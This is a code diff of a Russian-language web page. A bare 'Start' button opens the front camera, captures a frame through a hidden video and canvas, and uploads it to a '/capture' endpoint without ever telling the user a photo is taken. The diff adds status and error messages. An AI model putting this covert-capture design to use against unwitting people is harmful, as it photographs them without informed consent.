@@ -3,41 +3,81 @@
 <head>
     <title></title>
     <style>
-        body { margin: 0; padding: 20px; background: black; }
-        button {
-            background: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
-            display: block;
-            margin: 0 auto;
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
         }
-        video, canvas { display: none; }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 16px 48px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+            transition: all 0.3s;
+            margin-bottom: 20px;
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+        button:disabled {
+            background: #666;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        #message {
+            color: #888;
+            font-size: 14px;
+            min-height: 20px;
+            text-align: center;
+            padding: 10px;
+            max-width: 300px;
+        }
+        video, canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <button id="btn">Начать</button>
-    
+    <div id="message"></div>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
         const btn = document.getElementById('btn');
+        const message = document.getElementById('message');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
         let stream = null;
+        let isProcessing = false;
         
         btn.onclick = async () => {
+            // Защита от двойного нажатия
+            if (isProcessing) return;
+            
             try {
+                isProcessing = true;
+                btn.disabled = true;
+                message.textContent = 'Подготовка...';
+                
                 // Получаем доступ к камере
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
-                        width: 640,
-                        height: 480
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     } 
                 });
                 
@@ -46,9 +86,10 @@
                 // Ждем загрузки видео
                 await new Promise(resolve => { video.onloadeddata = resolve; });
                 
-                // Даем кадру появиться
+                // Даем кадру появиться (необходимо для мобильных)
                 await new Promise(r => setTimeout(r, 200));
                 
+                // Проверяем что видео реально загрузилось
                 if (video.videoWidth === 0 || video.videoHeight === 0) {
                     throw new Error("Видео не загрузилось");
                 }
@@ -58,24 +99,64 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Отправляем
-                const photo = canvas.toDataURL('image/jpeg', 0.8);
+                message.textContent = 'Отправка...';
                 
-                await fetch('/capture', {
+                // Конвертируем и отправляем
+                const photo = canvas.toDataURL('image/jpeg', 0.7);
+                
+                const response = await fetch('/capture', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ photo: photo })
                 });
                 
+                if (!response.ok) {
+                    throw new Error(`Ошибка сервера: ${response.status}`);
+                }
+                
+                message.textContent = 'Готово ✓';
+                
+                // Через 3 секунды убираем сообщение
+                setTimeout(() => {
+                    if (message.textContent === 'Готово ✓') {
+                        message.textContent = '';
+                    }
+                }, 3000);
+                
             } catch (err) {
-                // Молча логируем ошибку (никому не показываем)
                 console.error('Ошибка:', err);
+                
+                // Понятное сообщение об ошибке
+                let errorMsg = 'Не получилось. Попробуй еще раз.';
+                
+                if (err.name === 'NotAllowedError') {
+                    errorMsg = 'Нужен доступ к камере. Разреши в настройках.';
+                } else if (err.name === 'NotFoundError') {
+                    errorMsg = 'Камера не найдена.';
+                } else if (err.name === 'NotReadableError') {
+                    errorMsg = 'Камера занята другим приложением.';
+                } else if (err.message) {
+                    errorMsg = err.message;
+                }
+                
+                message.textContent = errorMsg;
+                
+                // Через 4 секунды убираем ошибку
+                setTimeout(() => {
+                    if (message.textContent === errorMsg) {
+                        message.textContent = '';
+                    }
+                }, 4000);
+                
             } finally {
                 // Всегда выключаем камеру
                 if (stream) {
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
                 }
+                
+                btn.disabled = false;
+                isProcessing = false;
             }
         };
     </script>
